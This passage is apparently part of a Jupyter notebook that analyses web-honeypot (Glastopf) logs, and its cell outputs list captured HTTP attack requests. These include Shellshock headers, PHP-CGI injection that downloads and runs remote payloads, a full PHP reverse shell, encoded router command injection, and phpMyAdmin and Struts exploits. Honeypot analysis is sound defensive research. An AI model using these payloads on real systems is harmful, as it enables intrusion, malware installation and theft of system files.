        "GET /cgi-bin/status/status.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    1\n",
        "GET /cgi-sys/entropysearch.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-bin/firmwarecfg HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET / HTTP/1.0\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: () { :;}; /bin/bash -c \"wget http://stablehost.us/bots/regular.bot -O /tmp/sh;curl -o /tmp/sh http://stablehost.us/bots/regular.bot;sh /tmp/sh;rm -rf /tmp/sh\"    1\n",
        "GET /upload.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    1\n",
        "GET /cgi-bin/php.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /sys-cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-bin/php HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET /cgi-bin/ HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; /usr/bin/id\\r\\nUser-Agent: () { foo;};echo; /usr/bin/id    1\n",
        "GET / HTTP/1.0\\r\\nAccept: */*\\r\\nReferer: () { :;}; echo \"BigBang: \" $(</etc/passwd)\\r\\nUser-Agent: () { :;}; echo \"BigBang: \" $(</etc/passwd)    1\n",
        "dtype: int64"
       ]
      }
     ],
     "prompt_number": 18
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "glastopf_df[glastopf_df['request_raw'].str.contains('%')]['request_raw'].value_counts()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 19,
       "text": [
        "POST /phpmyadmin/scripts/setup.php HTTP/1.1\\r\\nConnection: TE\\r\\nContent-Length: 206\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: 162.197.24.67\\r\\nReferer: http://162.197.24.67/phpmyadmin/scripts/setup.php\\r\\nTe: deflate,gzip;q=0.3\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]\\r\\n\\r\\naction=lay_navigation&eoltype=unix&token=&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA%5FConfig%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A31%3A%22ftp%3A%2F%2F104%2E192%2E103%2E3%2Fwebmin3%2Ephp%22%3B%7D%7D    6\n",
        "GET /w00tw00t.at.blackhats.romanian.anti-sec:%29 HTTP/1.1\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept-Language: en-us\\r\\nConnection: Close\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: ZmEu    3\n",
        "GET /w00tw00t.at.blackhats.romanian.anti-sec:%29 HTTP/1.1\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept-Language: en-us\\r\\nConnection: Close\\r\\nHost: 162.197.24.67\\r\\nUser-Agent: ZmEu    2\n",
        "POST /cgi-bin/wlogin.cgi HTTP/1.1\\r\\nConnection: Keep-Alive\\r\\nContent-Length: 27\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nExpect: 100-continue\\r\\nHost: 162.197.24.67:8080\\r\\n\\r\\naa=YWRtaW4%3d&ab=YWRtaW4%3d    1\n",
        "POST / HTTP/1.1\\r\\nAccept: */*\\r\\nConnection: Keep-Alive\\r\\nContent-Length: 395\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nExpect: 100-continue\\r\\nHost: 162.197.24.67\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\nredirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res.getWriter().print(%22dir:%22),%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()}    1\n",
        "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\\r\\nAccept: text/html, application/xhtml+xml, */*\\r\\nContent-Length: 25\\r\\nContent-Type: text/html\\r\\nExpect: 100-continue\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\\r\\n\\r\\n<?php echo xocoder123; ?>    1\n",
        "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\\r\\nConnection: close\\r\\nContent-Length: 160\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n\\r\\n<?php\\n system(\" id;killall .klogd;cd /var/tmp;rm -rf ...;mkdir ...;cd ...;wget http://82.141.104.123/ispconfig/temp/.../.../x.tgz;tar xvfz x.tgz;./.klogd \"); ?>    1\n",
        "POST /tmUnblock.cgi HTTP/1.1\\r\\nContent-Length: 1033\\r\\n\\r\\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%63%65%33%65%34%34%39%32%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%63%65%33%65%34%34%39%32%20%68%74%74%70%3a%2f%2f%39%39%2e%36%30%2e%32%34%34%2e%31%33%34%3a%33%32%30%30%22%20%3e%3e%20%2e%63%65%33%65%34%34%39%32%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%63%65%33%65%34%34%39%32%22%20%3e%3e%20%2e%63%65%33%65%34%34%39%32%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%63%65%33%65%34%34%39%32%22%20%3e%3e%20%2e%63%65%33%65%34%34%39%32%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%63%65%33%65%34%34%39%32%22%20%3e%3e%20%2e%63%65%33%65%34%34%39%32%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%63%65%33%65%34%34%39%32%2e%73%68%3b%2e%2f%2e%63%65%33%65%34%34%39%32%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1\n",
        "POST /cgi-bin/wlogin.cgi HTTP/1.1\\r\\nConnection: Keep-Alive\\r\\nContent-Length: 27\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nExpect: 100-continue\\r\\nHost: 54.68.96.53\\r\\n\\r\\naa=YWRtaW4%3d&ab=YWRtaW4%3d    1\n",
        "POST /phpmyadmin/scripts/setup.php HTTP/1.1\\r\\nConnection: Keep-Alive, TE\\r\\nContent-Length: 205\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: 162.197.24.67\\r\\nKeep-Alive: 300\\r\\nReferer: http://162.197.24.67/phpmyadmin/scripts/setup.php\\r\\nTe: deflate,gzip;q=0.3\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]\\r\\n\\r\\naction=lay_navigation&eoltype=unix&token=&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA%5FConfig%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A30%3A%22ftp%3A%2F%2F104%2E192%2E103%2E3%2Fwebmin%2Ephp%22%3B%7D%7D    1\n",
        "POST /tmUnblock.cgi HTTP/1.1\\r\\nContent-Length: 1033\\r\\n\\r\\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%32%34%31%36%38%35%62%39%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%32%34%31%36%38%35%62%39%20%68%74%74%70%3a%2f%2f%37%32%2e%31%33%33%2e%33%34%2e%31%35%34%3a%33%32%30%30%22%20%3e%3e%20%2e%32%34%31%36%38%35%62%39%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%32%34%31%36%38%35%62%39%22%20%3e%3e%20%2e%32%34%31%36%38%35%62%39%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%32%34%31%36%38%35%62%39%22%20%3e%3e%20%2e%32%34%31%36%38%35%62%39%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%32%34%31%36%38%35%62%39%22%20%3e%3e%20%2e%32%34%31%36%38%35%62%39%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%32%34%31%36%38%35%62%39%2e%73%68%3b%2e%2f%2e%32%34%31%36%38%35%62%39%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1\n",
        "POST /tmUnblock.cgi HTTP/1.1\\r\\nContent-Length: 1036\\r\\n\\r\\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%34%38%61%63%38%63%64%61%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%34%38%61%63%38%63%64%61%20%68%74%74%70%3a%2f%2f%31%31%32%2e%32%30%39%2e%37%33%2e%32%31%37%3a%33%32%30%30%22%20%3e%3e%20%2e%34%38%61%63%38%63%64%61%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%34%38%61%63%38%63%64%61%22%20%3e%3e%20%2e%34%38%61%63%38%63%64%61%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%34%38%61%63%38%63%64%61%22%20%3e%3e%20%2e%34%38%61%63%38%63%64%61%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%34%38%61%63%38%63%64%61%22%20%3e%3e%20%2e%34%38%61%63%38%63%64%61%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%34%38%61%63%38%63%64%61%2e%73%68%3b%2e%2f%2e%34%38%61%63%38%63%64%61%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1\n",
        "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\\r\\nAccept: text/html, application/xhtml+xml, */*\\r\\nConnection: Keep-Alive\\r\\nContent-Length: 25\\r\\nContent-Type: text/html\\r\\nExpect: 100-continue\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\\r\\n\\r\\n<?php echo xocoder123; ?>    1\n",
        "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\\r\\nConnection: close\\r\\nContent-Length: 2171\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n\\r\\n<?php system(\"wget 208.85.177.238/.x/hb/php04 -O /tmp/.bash_h1s7;perl /tmp/.bash_h1s7 85.214.73.166;rm -rf /tmp/.bash_h1s7 &\"); ?>set_time_limit(0);\\n$ip = '91.121.105.21';\\n$port = 22;\\n$chunk_size = 1400;\\n$write_a = null;\\n$error_a = null;\\n$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';\\n$daemon = 0;\\n$debug = 0;\\nif (function_exists('pcntl_fork')) {\\n\\t$pid = pcntl_fork();\\t\\n\\tif ($pid == -1) {\\n\\t\\tprintit(\"ERROR: Can't fork\");\\n\\t\\texit(1);\\n\\t}\\n\\tif ($pid) {\\n\\t\\texit(0);\\n\\t}\\n\\tif (posix_setsid() == -1) {\\n\\t\\tprintit(\"Error: Can't setsid()\");\\n\\t\\texit(1);\\n\\t}\\n\\t$daemon = 1;\\n} else {\\n\\tprintit(\"WARNING: Failed to daemonise.\");\\n}\\nchdir(\"/\");\\numask(0);\\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\nif (!$sock) {\\n\\tprintit(\"$errstr ($errno)\");\\n\\texit(1);\\n}\\n$descriptorspec = array(\\n   0 => array(\"pipe\", \"r\"),\\n   1 => array(\"pipe\", \"w\"),\\n   2 => array(\"pipe\", \"w\")\\n);\\n$process = proc_open($shell, $descriptorspec, $pipes);\\nif (!is_resource($process)) {\\n\\tprintit(\"ERROR: Can't spawn shell\");\\n\\texit(1);\\n}\\nstream_set_blocking($pipes[0], 0);\\nstream_set_blocking($pipes[1], 0);\\nstream_set_blocking($pipes[2], 0);\\nstream_set_blocking($sock, 0);\\nwhile (1) {\\n\\tif (feof($sock)) {\\n\\t\\tprintit(\"ERROR: Shell connection terminated\");\\n\\t\\tbreak;\\n\\t}\\n\\tif (feof($pipes[1])) {\\n\\t\\tprintit(\"ERROR: Shell process terminated\");\\n\\t\\tbreak;\\n\\t}\\n\\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n\\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n\\tif (in_array($sock, $read_a)) {\\n\\t\\tif ($debug) printit(\"SOCK READ\");\\n\\t\\t$input = fread($sock, $chunk_size);\\n\\t\\tif ($debug) printit(\"SOCK: $input\");\\n\\t\\tfwrite($pipes[0], $input);\\n\\t}\\n\\tif (in_array($pipes[1], $read_a)) {\\n\\t\\tif ($debug) printit(\"STDOUT READ\");\\n\\t\\t$input = fread($pipes[1], $chunk_size);\\n\\t\\tif ($debug) printit(\"STDOUT: $input\");\\n\\t\\tfwrite($sock, $input);\\n\\t}\\n\\tif (in_array($pipes[2], $read_a)) {\\n\\t\\tif ($debug) printit(\"STDERR READ\");\\n\\t\\t$input = fread($pipes[2], $chunk_size);\\n\\t\\tif ($debug) printit(\"STDERR: $input\");\\n\\t\\tfwrite($sock, $input);\\n\\t}\\n}\\n\\nfclose($sock);\\nfclose($pipes[0]);\\nfclose($pipes[1]);\\nfclose($pipes[2]);\\nproc_close($process);\\nfunction printit ($string) {\\n\\tif (!$daemon) {\\n\\t\\tprint \"$string\\n\";\\n\\t}\\n}\\nexit(1);\\n?>    1\n",
        "POST /phpmyadmin/scripts/setup.php HTTP/1.1\\r\\nConnection: TE\\r\\nContent-Length: 205\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: 162.197.24.67\\r\\nReferer: http://162.197.24.67/phpmyadmin/scripts/setup.php\\r\\nTe: deflate,gzip;q=0.3\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]\\r\\n\\r\\naction=lay_navigation&eoltype=unix&token=&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA%5FConfig%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A30%3A%22ftp%3A%2F%2F104%2E192%2E103%2E3%2Fwebmin%2Ephp%22%3B%7D%7D    1\n",
        "POST /tmUnblock.cgi HTTP/1.1\\r\\nContent-Length: 1030\\r\\n\\r\\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%31%31%33%33%65%34%64%34%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%31%31%33%33%65%34%64%34%20%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%37%2e%36%34%3a%33%32%30%30%22%20%3e%3e%20%2e%31%31%33%33%65%34%64%34%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%31%31%33%33%65%34%64%34%22%20%3e%3e%20%2e%31%31%33%33%65%34%64%34%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%31%31%33%33%65%34%64%34%22%20%3e%3e%20%2e%31%31%33%33%65%34%64%34%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%31%31%33%33%65%34%64%34%22%20%3e%3e%20%2e%31%31%33%33%65%34%64%34%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%31%31%33%33%65%34%64%34%2e%73%68%3b%2e%2f%2e%31%31%33%33%65%34%64%34%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1\n",
        "POST /tmUnblock.cgi HTTP/1.1\\r\\nContent-Length: 1030\\r\\n\\r\\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%61%62%66%32%36%30%39%38%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%61%62%66%32%36%30%39%38%20%68%74%74%70%3a%2f%2f%34%36%2e%31%30%2e%31%37%36%2e%31%33%3a%33%32%30%30%22%20%3e%3e%20%2e%61%62%66%32%36%30%39%38%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%61%62%66%32%36%30%39%38%22%20%3e%3e%20%2e%61%62%66%32%36%30%39%38%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%61%62%66%32%36%30%39%38%22%20%3e%3e%20%2e%61%62%66%32%36%30%39%38%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%61%62%66%32%36%30%39%38%22%20%3e%3e%20%2e%61%62%66%32%36%30%39%38%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%61%62%66%32%36%30%39%38%2e%73%68%3b%2e%2f%2e%61%62%66%32%36%30%39%38%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1\n",
        "POST /tmUnblock.cgi HTTP/1.1\\r\\nContent-Length: 1027\\r\\n\\r\\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%33%37%39%33%35%34%36%65%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%33%37%39%33%35%34%36%65%20%68%74%74%70%3a%2f%2f%32%31%31%2e%32%34%2e%31%32%2e%34%3a%33%32%30%30%22%20%3e%3e%20%2e%33%37%39%33%35%34%36%65%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%33%37%39%33%35%34%36%65%22%20%3e%3e%20%2e%33%37%39%33%35%34%36%65%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%33%37%39%33%35%34%36%65%22%20%3e%3e%20%2e%33%37%39%33%35%34%36%65%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%33%37%39%33%35%34%36%65%22%20%3e%3e%20%2e%33%37%39%33%35%34%36%65%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%33%37%39%33%35%34%36%65%2e%73%68%3b%2e%2f%2e%33%37%39%33%35%34%36%65%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1\n",
        "GET %3Ctitle%3EphpMyAdmin HTTP/1.1\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept-Language: en-us\\r\\nConnection: Close\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)    1\n",
        "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\\r\\nAccept: text/html, application/xhtml+xml, */*\\r\\nContent-Length: 25\\r\\nContent-Type: text/html\\r\\nExpect: 100-continue\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\\r\\n\\r\\n<?php echo xocoder123; ?>    1\n",
        "POST /tmUnblock.cgi HTTP/1.1\\r\\nContent-Length: 1033\\r\\n\\r\\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%65%37%37%66%31%38%33%34%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%65%37%37%66%31%38%33%34%20%68%74%74%70%3a%2f%2f%32%31%31%2e%32%34%2e%34%37%2e%31%34%37%3a%33%32%30%30%22%20%3e%3e%20%2e%65%37%37%66%31%38%33%34%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%65%37%37%66%31%38%33%34%22%20%3e%3e%20%2e%65%37%37%66%31%38%33%34%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%65%37%37%66%31%38%33%34%22%20%3e%3e%20%2e%65%37%37%66%31%38%33%34%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%65%37%37%66%31%38%33%34%22%20%3e%3e%20%2e%65%37%37%66%31%38%33%34%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%65%37%37%66%31%38%33%34%2e%73%68%3b%2e%2f%2e%65%37%37%66%31%38%33%34%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1\n",
